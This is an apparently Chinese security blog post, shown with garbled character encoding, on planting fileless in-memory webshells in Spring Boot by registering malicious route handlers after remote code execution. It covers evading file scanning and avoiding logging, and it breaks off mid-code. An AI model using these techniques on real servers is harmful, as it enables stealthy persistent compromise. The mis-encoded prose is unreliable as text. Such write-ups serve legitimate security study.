<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="en">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Tomcatå†…å­˜é©¬" />





  <link rel="alternate" href="/atom.xml" title="Xiaopan233 Blog" type="application/atom+xml" />






<meta name="description" content="å­˜è´§æ–‡ï¼Œç§¯äº†å¥½ä¹…ï¼Œæ‡’å¾—å‘233ï¼Œä»Šå¤©å‘ä¸‹ã€‚ æœ¬æ–‡å†™çš„å¾ˆåƒåœ¾ï¼Œå»ºè®®å­¦è¿‡åŸºæœ¬çš„ä¹‹åï¼Œå½“ç¬”è®°çœ‹å°±å¥½äº†ã€‚æœ¬æ–‡å†™äº†ç‚¹å¯èƒ½æ¯”è¾ƒæ–°å¥‡çš„ä¸œè¥¿ã€‚ æƒ³è®¤çœŸå­¦çš„è¿˜æ˜¯å»çœ‹æ–‡æœ«çš„Refå§ã€‚ å‰æï¼šå’Œå›æ˜¾ç±»ä¼¼ã€‚å¾—å…ˆRCE å¥½å¤„ï¼šè§„é¿é™æ€æ–‡ä»¶çš„æŸ¥æ€ åŸç†ï¼šJava Webä¸åƒapache + phpæ¨¡å¼ï¼Œæ¯ä¸€æ¬¡è¯·æ±‚éƒ½æ˜¯ç”Ÿæˆæ–°çš„phpå®ä¾‹ã€‚Java Webæ˜¯é•¿æœŸè¿è¡Œçš„ï¼ˆåŒç†çš„è¿˜æœ‰.netã€goã€pythonè¿™äº›ï¼‰ã€‚Webç¨‹åºå¿…å®š">
<meta property="og:type" content="article">
<meta property="og:title" content="Tomcatå†…å­˜é©¬">
<meta property="og:url" content="http://example.com/2022/07/07/2022-07-07-java-memory-shell/index.html">
<meta property="og:site_name" content="Xiaopan233 Blog">
<meta property="og:description" content="å­˜è´§æ–‡ï¼Œç§¯äº†å¥½ä¹…ï¼Œæ‡’å¾—å‘233ï¼Œä»Šå¤©å‘ä¸‹ã€‚ æœ¬æ–‡å†™çš„å¾ˆåƒåœ¾ï¼Œå»ºè®®å­¦è¿‡åŸºæœ¬çš„ä¹‹åï¼Œå½“ç¬”è®°çœ‹å°±å¥½äº†ã€‚æœ¬æ–‡å†™äº†ç‚¹å¯èƒ½æ¯”è¾ƒæ–°å¥‡çš„ä¸œè¥¿ã€‚ æƒ³è®¤çœŸå­¦çš„è¿˜æ˜¯å»çœ‹æ–‡æœ«çš„Refå§ã€‚ å‰æï¼šå’Œå›æ˜¾ç±»ä¼¼ã€‚å¾—å…ˆRCE å¥½å¤„ï¼šè§„é¿é™æ€æ–‡ä»¶çš„æŸ¥æ€ åŸç†ï¼šJava Webä¸åƒapache + phpæ¨¡å¼ï¼Œæ¯ä¸€æ¬¡è¯·æ±‚éƒ½æ˜¯ç”Ÿæˆæ–°çš„phpå®ä¾‹ã€‚Java Webæ˜¯é•¿æœŸè¿è¡Œçš„ï¼ˆåŒç†çš„è¿˜æœ‰.netã€goã€pythonè¿™äº›ï¼‰ã€‚Webç¨‹åºå¿…å®š">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2022/07/07/2022-07-07-java-memory-shell/3.png">
<meta property="og:image" content="http://example.com/2022/07/07/2022-07-07-java-memory-shell/3.png">
<meta property="og:image" content="http://example.com/2022/07/07/2022-07-07-java-memory-shell/1.gif">
<meta property="article:published_time" content="2022-07-07T15:24:02.000Z">
<meta property="article:modified_time" content="2022-11-20T06:11:03.824Z">
<meta property="article:author" content="Xiaopan233">
<meta property="article:tag" content="java">
<meta property="article:tag" content="Tomcat">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2022/07/07/2022-07-07-java-memory-shell/3.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '',
    scheme: 'Mist',
    version: '5.1.4',
    sidebar: {"position":"right","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://example.com/2022/07/07/2022-07-07-java-memory-shell/"/>





  <title>Tomcatå†…å­˜é©¬ | Xiaopan233 Blog</title>
  








<meta name="generator" content="Hexo 5.4.0"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-right page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Xiaopan233 Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/atom.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            Sitemap
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/2020/01/01/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            About
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

<script>
  var server_url = "http://127.0.0.1/blog_v1/blog_v1.php";
</script>

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/07/2022-07-07-java-memory-shell/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiaopan233 Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">Tomcatå†…å­˜é©¬</h1>
        
        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-07-07T23:24:02+08:00">
                2022-07-07
              </time>
            

            

            
          </span>
          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/java/" itemprop="url" rel="index">
                    <span itemprop="name">java</span>
                  </a>
                </span>

                
                
              
            </span>
          
          
            
          


          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>å­˜è´§æ–‡ï¼Œç§¯äº†å¥½ä¹…ï¼Œæ‡’å¾—å‘233ï¼Œä»Šå¤©å‘ä¸‹ã€‚</p>
<p>æœ¬æ–‡å†™çš„å¾ˆåƒåœ¾ï¼Œå»ºè®®å­¦è¿‡åŸºæœ¬çš„ä¹‹åï¼Œå½“ç¬”è®°çœ‹å°±å¥½äº†ã€‚æœ¬æ–‡å†™äº†ç‚¹å¯èƒ½æ¯”è¾ƒæ–°å¥‡çš„ä¸œè¥¿ã€‚</p>
<p>æƒ³è®¤çœŸå­¦çš„è¿˜æ˜¯å»çœ‹æ–‡æœ«çš„Refå§ã€‚</p>
<p><strong>å‰æï¼šå’Œå›æ˜¾ç±»ä¼¼ã€‚å¾—å…ˆRCE</strong></p>
<p><strong>å¥½å¤„ï¼šè§„é¿é™æ€æ–‡ä»¶çš„æŸ¥æ€</strong></p>
<p><strong>åŸç†ï¼š</strong>Java Webä¸åƒapache + phpæ¨¡å¼ï¼Œæ¯ä¸€æ¬¡è¯·æ±‚éƒ½æ˜¯ç”Ÿæˆæ–°çš„phpå®ä¾‹ã€‚Java Webæ˜¯é•¿æœŸè¿è¡Œçš„ï¼ˆåŒç†çš„è¿˜æœ‰.netã€goã€pythonè¿™äº›ï¼‰ã€‚Webç¨‹åºå¿…å®šä¼šæœ‰ç›¸å…³çš„å˜é‡ã€é€»è¾‘è¿›è¡Œè¯·æ±‚åˆ†å‘çš„æ“ä½œã€‚å½“æˆ‘ä»¬RCEä¹‹åï¼Œè‹¥èƒ½æ§åˆ¶è¿›è¡Œè¯·æ±‚åˆ†å‘çš„å˜é‡ï¼Œä¾¿èƒ½æ§åˆ¶è¯·æ±‚åˆ†å‘çš„é€»è¾‘ã€‚</p>
<p>å¸¸è§çš„æ“ä½œæœ‰ï¼šæ–°å¢æ§åˆ¶å™¨ã€ä¿®æ”¹æ§åˆ¶å™¨ã€æ·»åŠ æ‹¦æˆªå™¨ç­‰</p>
<span id="more"></span>



<p><strong>æ­¥éª¤</strong>ï¼š</p>
<ol>
<li>æ„é€ æ¶æ„ç±»</li>
<li>è·å–ä¸Šä¸‹æ–‡å¯¹è±¡</li>
<li>æ‹¿åˆ°Filterã€Servletè¿™äº›ä¸œè¥¿çš„æ³¨å†Œç±»</li>
<li>å¾€æ³¨å†Œç±»é‡Œæ³¨å†Œæ¶æ„ç±»</li>
</ol>
<h1 id="SpringBoot"><a href="#SpringBoot" class="headerlink" title="SpringBoot"></a>SpringBoot</h1><p>æœ¬ä¾‹ç¯å¢ƒä¸ºï¼šSpringBoot2.6.1</p>
<h1 id="è·å–ä¸Šä¸‹æ–‡å¯¹è±¡"><a href="#è·å–ä¸Šä¸‹æ–‡å¯¹è±¡" class="headerlink" title="è·å–ä¸Šä¸‹æ–‡å¯¹è±¡"></a>è·å–ä¸Šä¸‹æ–‡å¯¹è±¡</h1><p>ä¸Šä¸‹æ–‡å¯¹è±¡ä¸­å­˜æ”¾äº†å¤§é‡çš„beanã€‚å¤§éƒ¨åˆ†æ˜¯Springè¿è¡Œä¾èµ–çš„ç±»å¯¹è±¡ã€‚æ‹¿åˆ°è¿™äº›beanã€‚ç›¸å½“äºæˆåŠŸäº†ä¸€åŠã€‚</p>
<p><strong>getAttributeæ–¹å¼</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ServletRequestAttributes requestAttributes = (ServletRequestAttributes)RequestContextHolder.getRequestAttributes();</span><br><span class="line">HttpServletRequest httpServletRequest = requestAttributes.getRequest();</span><br><span class="line">(WebApplicationContext)servletContext1.getAttribute(XXXX);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">å­˜å‚¨WebApplicationContextçš„å±æ€§</span></span><br><span class="line"><span class="comment">org.springframework.web.servlet.DispatcherServlet.THEME_SOURCE</span></span><br><span class="line"><span class="comment">org.springframework.web.servlet.DispatcherServlet.CONTEXT</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ServletRequestAttributes requestAttributes1 = (ServletRequestAttributes)RequestContextHolder.getRequestAttributes();</span><br><span class="line">ServletContext servletContext1 = requestAttributes1.getRequest().getServletContext();</span><br><span class="line">(WebApplicationContext)servletContext1.getAttribute(XXXX);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">å­˜å‚¨WebApplicationContextçš„å±æ€§</span></span><br><span class="line"><span class="comment">org.springframework.web.context.WebApplicationContext.ROOT</span></span><br><span class="line"><span class="comment">org.springframework.web.servlet.FrameworkServlet.CONTEXT.dispatcherServlet</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>



<p><strong>WebApplicationContextUtilsæ–¹å¼</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ServletRequestAttributes requestAttributes = (ServletRequestAttributes) RequestContextHolder.currentRequestAttributes();</span><br><span class="line">HttpServletRequest request = requestAttributes.getRequest();</span><br><span class="line">ServletContext servletContext = request.getServletContext();</span><br><span class="line">WebApplicationContext webApplicationContext = WebApplicationContextUtils.getWebApplicationContext(servletContext);</span><br></pre></td></tr></table></figure>



<p><strong>ContextLoaderæ–¹å¼</strong></p>
<p><em>è¿™ä¸ªæˆ‘åœ¨SpringBooté‡Œç”¨ï¼Œè¿”å›çš„æ˜¯Nullã€‚ã€‚ã€‚ã€‚</em></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebApplicationContext currentWebApplicationContext = ContextLoader.getCurrentWebApplicationContext();</span><br></pre></td></tr></table></figure>



<p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong></p>
<p>ä»¥ä¸Šæ‹¿åˆ°çš„WebApplicationContextéƒ½æ˜¯<code>AnnotationConfigServletWebServerApplicationContext</code>çš„å®ä¾‹</p>
<p>ä½†æ˜¯ï¼Œ<code>getBeanFactory()</code>åœ¨<code>GenericApplicationContext</code>ç±»ä¸­ã€‚æ‰€ä»¥è¦ç±»å‹è½¬æ¢ä¸€ä¸‹ã€‚</p>
<p><strong>å…³äºIOC</strong></p>
<p>Spring IOCå®¹å™¨ï¼ˆBeanFactoryï¼‰ä¸­ï¼ŒBeanå¯¹è±¡å­˜æ”¾çš„æ–¹å¼ä¸ºï¼š</p>
<p>è·å–å±æ€§çš„æ“ä½œåœ¨ï¼š<em>DefaultListableBeanFactory#getBean</em></p>
<p>å®é™…å±æ€§çš„ä½ç½®åœ¨ï¼š<em>DefaultSingletonBeanRegistry.singletonObjects</em></p>
<h1 id="æ‰‹åŠ¨æ³¨å†ŒController"><a href="#æ‰‹åŠ¨æ³¨å†ŒController" class="headerlink" title="æ‰‹åŠ¨æ³¨å†ŒController"></a>æ‰‹åŠ¨æ³¨å†ŒController</h1><p>ä»æºç è§’åº¦çœ‹ï¼šè¯·æ±‚åˆ†å‘å…¥å£ <em>DispatcherServlet#doDispatch</em></p>
<p>å…³é”®æ“ä½œ</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">processedRequest = checkMultipart(request); <span class="comment">//ç»„è£…è¯·æ±‚ä¸ºMultipart</span></span><br><span class="line"></span><br><span class="line">mappedHandler = getHandler(processedRequest); <span class="comment">//ä»IOCä¸­æ‰¾bean[!]</span></span><br><span class="line"></span><br><span class="line">HandlerAdapter ha = getHandlerAdapter(mappedHandler.getHandler());</span><br><span class="line"></span><br><span class="line">mv = ha.handle(processedRequest, response, mappedHandler.getHandler()); <span class="comment">//å®é™…è°ƒç”¨Controller</span></span><br></pre></td></tr></table></figure>



<h3 id="getHandler-æ–¹æ³•"><a href="#getHandler-æ–¹æ³•" class="headerlink" title="getHandler()æ–¹æ³•"></a><code>getHandler()</code>æ–¹æ³•</h3><p><strong><code>getHandler()</code><strong>æ˜¯æ¯”è¾ƒé‡è¦çš„æ–¹æ³•ã€‚ä¸»è¦é€»è¾‘æ˜¯æ ¹æ®è¯·æ±‚urlï¼Œæ‰¾å¯¹åº”çš„å¤„ç†å™¨ï¼Œä¹Ÿå°±æ˜¯</strong>HandlerMapping</strong>çš„é€‚é…ã€‚</p>
<p><code>HandlerMapping</code>å¦‚ä¸‹</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">RequestMappingHandlerMapping</span><br><span class="line">BeanNameUrlHandlerMapping</span><br><span class="line">RouterFunctionMapping</span><br><span class="line">SimpleUrlHandlerMapping</span><br><span class="line">WelcomePageHandlerMapping</span><br></pre></td></tr></table></figure>



<p><code>HandlerMapping#getHandler()</code> <strong>ä¼šè°ƒç”¨</strong><code>AbstractHandlerMapping#getHandlerInternal()</code>ã€‚å¯¹äºè¿™ä¸ªæ–¹æ³•çš„å®ç°ã€‚æœ‰å¯åˆ†ä¸ºä¸‰ä¸ªæŠ½è±¡ç±»</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">AbstractHandlerMethodMapping</span><br><span class="line">	RequestMappingHandlerMapping</span><br><span class="line">    </span><br><span class="line">AbstractUrlHandlerMapping</span><br><span class="line">    BeanNameUrlHandlerMapping</span><br><span class="line">    SimpleUrlHandlerMapping</span><br><span class="line">    WelcomePageHandlerMapping</span><br><span class="line">    </span><br><span class="line">RouterFunctionMapping</span><br><span class="line">    æ ¹æ®<span class="keyword">this</span>.routerFunction.route() è¿”å›HandlerFunction</span><br><span class="line">    <span class="comment">//æœ‰å¥½å¤šlambdaã€‚å¯ä»¥å½“ä¸€ä¸ªéš¾æ£€æµ‹ğŸï¼Ÿ</span></span><br></pre></td></tr></table></figure>



<p>æ·±ç©¶åå¯ä»¥å‘ç°ï¼Œå‰ä¸¤ä¸ªæŠ½è±¡ç±»éƒ½å­˜åœ¨ç€<strong>è·¯ç”±æ˜ å°„</strong>å±æ€§ã€‚è€Œ<code>RouterFunctionMapping</code>æ¯”è¾ƒç‰¹æ®Šï¼Œåæ–‡è¯´ã€‚</p>
<p><code>AbstractHandlerMethodMapping</code>å’Œ<code>AbstractUrlHandlerMapping</code>å¤§åŒå°å¼‚ã€‚åªæ˜¯æœ€åçš„æ˜ å°„Mapä¸ä¸€æ ·è€Œå·²ã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//AbstractHandlerMethodMapping</span></span><br><span class="line"><span class="comment">//Mapåä¸ºmappingRegistry</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> HandlerMethod <span class="title">lookupHandlerMethod</span><span class="params">(String lookupPath, HttpServletRequest request)</span></span>&#123;</span><br><span class="line">    List&lt;T&gt; directPathMatches = <span class="keyword">this</span>.mappingRegistry.getMappingsByDirectPath(lookupPath);</span><br><span class="line">    .....</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//AbstractUrlHandlerMapping</span></span><br><span class="line"><span class="comment">//Mapåä¸ºhandlerMap</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">getDirectMatch</span><span class="params">(String urlPath, HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">    Object handler = <span class="keyword">this</span>.handlerMap.get(urlPath);</span><br><span class="line">    .....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>æ³¨å…¥é©¬çš„æ€è·¯ï¼šæ“ä½œè·¯ç”±æ˜ å°„çš„Mapã€‚æ§åˆ¶ç¨‹åºçš„è·¯ç”±èµ°å‘ã€‚å°†è·¯ç”±<strong>æ˜ å°„</strong>åˆ°æ¶æ„ç±»çš„æ¶æ„æ–¹æ³•ä¸­</p>
<p>é‚£é©¬ä¸ºä»€ä¹ˆè¦åŠ <strong>å†…å­˜</strong>äºŒå­—å‘¢ï¼Ÿå› ä¸ºæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>defineClass()</code>ï¼Œç›´æ¥å°†å­—èŠ‚ç è¿˜åŸæˆå¯¹è±¡å®ä¾‹ã€‚æ— æ–‡ä»¶è½åœ°ã€‚</p>
<p>æ‰¾Mapèµ‹å€¼ä½ç½®çš„æ€è·¯ï¼šæ‰¾åˆ°Mapå˜é‡ï¼Œæœç´¢èµ‹å€¼ç‚¹ã€‚æœ€ç»ˆæ‰¾åˆ°è¿™ä¸¤ä¸ªæ–¹æ³•ï¼Œå¯¹äºä¸Šæ–‡çš„ä¸¤ä¸ªæŠ½è±¡ç±»ã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AbstractHandlerMethodMapping$MappingRegistry#register(T mapping, Object handler, Method method)</span><br><span class="line">AbstractUrlHandlerMapping#registerHandler(String urlPath, Object handler)</span><br></pre></td></tr></table></figure>



<p>é‚£æ¥ä¸‹æ¥ç®€å•äº†ã€‚<strong>è°ƒç”¨è¿™ä¸¤æ¥å£</strong>ã€‚å°±å¯ä»¥æ³¨å†Œä»»æ„çš„<strong>è·¯ç”±æ˜ å°„</strong>äº†ã€‚</p>
<h2 id="AbstractHandlerMethodMappingæ³¨å†Œå†…å­˜é©¬"><a href="#AbstractHandlerMethodMappingæ³¨å†Œå†…å­˜é©¬" class="headerlink" title="AbstractHandlerMethodMappingæ³¨å†Œå†…å­˜é©¬"></a><code>AbstractHandlerMethodMapping</code>æ³¨å†Œå†…å­˜é©¬</h2><p><em>AbstractHandlerMethodMapping</em>çš„æ³¨å†Œå›ºç„¶å¯ä»¥ä½¿ç”¨<code>registerMapping()</code>ã€‚ä½†æ˜¯ä»–ä¼šè®°å½•ä¸€ä¸ªloggerã€‚ä¸ä¼˜é›…</p>
<p><em>AbstractHandlerMethodMapping#registerMapping</em></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registerMapping</span><span class="params">(T mapping, Object handler, Method method)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</span><br><span class="line">        <span class="comment">//è®°å½•æ—¥å¿—æ“ä½œ</span></span><br><span class="line">        logger.trace(<span class="string">&quot;Register \&quot;&quot;</span> + mapping + <span class="string">&quot;\&quot; to &quot;</span> + method.toGenericString());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.mappingRegistry.register(mapping, handler, method);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥è°ƒç”¨<code>this.mappingRegistry.register</code>ï¼Œæ›´ç›´æ¥ã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">register</span><span class="params">(T mapping, Object handler, Method method)</span></span></span><br></pre></td></tr></table></figure>

<p>å…·ä½“çš„å‚æ•°å’Œç±»å‹ï¼Œæˆ‘ä»¬å¯ä»¥å‚è€ƒå…¶å­ç±»ã€‚ä¹Ÿå°±æ˜¯<code>RequestMappingHandlerMapping#registerMapping</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registerMapping</span><span class="params">(RequestMappingInfo mapping, Object handler, Method method)</span></span></span><br></pre></td></tr></table></figure>



<p>çœ‹çœ‹æ­£å¸¸çš„controllerã€‚å…¶<code>RequestMappingInfo</code>é•¿å•¥æ ·ã€‚å¯ä»¥åœ¨<code>AbstractHandlerMethodMapping#addMatchingMappings</code>çœ‹åˆ°ã€‚</p>
<p><img src="/2022/07/07/2022-07-07-java-memory-shell/3.png"></p>
<p><code>RequestMappingInfo</code>ä¸­è®¾ç½®äº†<code>pathPatternsCondition</code>çš„å€¼ã€‚ä»¿ç€å†™ï¼Œå°±å¯¹äº†ã€‚å¦‚æœ<code>patternsCondition</code>è®¾ç½®äº†å€¼ï¼Œä¼šæœ‰ä¸€ä¸ªå‘ï¼šSpringMVCåœ¨ <em>AbstractHandlerMapping#initLookupPath</em>ä¸­ï¼Œç§»é™¤äº†<code>UrlPathHelper.PATH_ATTRIBUTE</code>å±æ€§ã€‚ä½†æ˜¯åœ¨<code>UrlPathHelper#getResolvedLookupPath</code>åˆæ‹¿äº†ä¸€æ¬¡<code>UrlPathHelper.PATH_ATTRIBUTE</code>å±æ€§ã€‚ä¼šè¢«<code>Assert.notNull()</code>ç»ˆæ­¢ã€‚</p>
<p>ä¸ºäº†é¿å‘ï¼Œè¿˜æ˜¯ä»¿ç€æ­£å¸¸æ ¼å¼æ¥æ„é€ å§ã€‚</p>
<h2 id="AbstractUrlHandlerMappingæ³¨å†Œå†…å­˜é©¬"><a href="#AbstractUrlHandlerMappingæ³¨å†Œå†…å­˜é©¬" class="headerlink" title="AbstractUrlHandlerMappingæ³¨å†Œå†…å­˜é©¬"></a><code>AbstractUrlHandlerMapping</code>æ³¨å†Œå†…å­˜é©¬</h2><p>æ¯”<code>AbstractHandlerMethodMapping</code>æ³¨å†Œè¿˜ç®€å•ã€‚çœ‹åˆ°ä»–çš„æ³¨å†Œæ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">registerHandler</span><span class="params">(String urlPath, Object handler)</span></span></span><br></pre></td></tr></table></figure>

<p>æ²¡å•¥éš¾çš„ï¼Œ</p>
<h2 id="RouterFunctionMappingæ³¨å†Œå†…å­˜é©¬"><a href="#RouterFunctionMappingæ³¨å†Œå†…å­˜é©¬" class="headerlink" title="RouterFunctionMappingæ³¨å†Œå†…å­˜é©¬"></a><code>RouterFunctionMapping</code>æ³¨å†Œå†…å­˜é©¬</h2><p><strong>ååˆ†å±é™©ã€‚<code>RouterFunctionMapping</code>åªæœ‰ä¸€ä¸ª<code>routerFunction</code>ï¼Œæ™®é€šçš„SpringBooté¡¹ç›®è¿™ä¸ªå±æ€§æ˜¯nullï¼Œä½†å¦‚æœæ”»å‡»çš„ç¨‹åºæœ‰ä½¿ç”¨<code>RouterFunctionMapping</code>ï¼Œå¾ˆå¯èƒ½ä¼šå´©</strong></p>
<p>çœ‹ä¸‹<code>RouterFunctionMapping#getHandlerInternal</code>ã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">getHandlerInternal</span><span class="params">(HttpServletRequest servletRequest)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.routerFunction != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">//[!]è°ƒç”¨this.routerFunction.route()</span></span><br><span class="line">        